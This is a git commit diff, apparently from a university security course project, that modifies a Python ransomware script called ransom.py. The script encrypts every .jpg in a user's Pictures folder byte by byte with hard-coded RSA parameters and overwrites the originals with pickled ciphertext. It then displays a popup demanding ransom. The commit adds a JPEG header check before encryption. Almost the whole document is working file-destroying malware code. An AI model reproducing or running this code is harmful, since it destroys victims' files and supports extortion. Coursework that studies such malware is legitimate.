fc22e7fd2be983729bff327d7540eee66490b814
nctu-ms07 <ms07.ms07+github@nctu.edu.tw>
2023-01-16 02:49:52 +0800

    check jpg header syntax

--- Project3/ransom.py
+++ Project3/ransom.py
@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 
-import os, sys, pickle, subprocess
+import os, pickle, subprocess
 
 n = int(22291846172619859445381409012451)
 e = int(65535)
 
 directory = r'/home/csc2021/Pictures'
-#directory = r'/home/user/Documents'
+#directory = r'/home/user/Pictures'
 
 for filename in os.listdir(directory):
     if filename.endswith(".jpg"):
@@ -14,9 +14,10 @@ for filename in os.listdir(directory):
         plain_bytes = b''
         with open(filepath, 'rb') as file:
             plain_bytes = file.read()
-        cipher = [pow(i, e, n) for i in plain_bytes]
-        filename += 'x'
-        with open(filepath, 'wb') as file:
-            pickle.dump(cipher, file)
+        # jpg header syntax
+        if((len(plain_bytes) > 2 and plain_bytes[0] == 0xFF and plain_bytes[1] == 0xD8 and plain_bytes[2] == 0xFF)):
+            cipher_int = [pow(i, e, n) for i in plain_bytes]
+            with open(filepath, 'wb') as file:
+                pickle.dump(cipher_int, file)
 
 subprocess.call("zenity --error --text=\"Give me ransom haha\" --title=\"Error\"", shell = True)
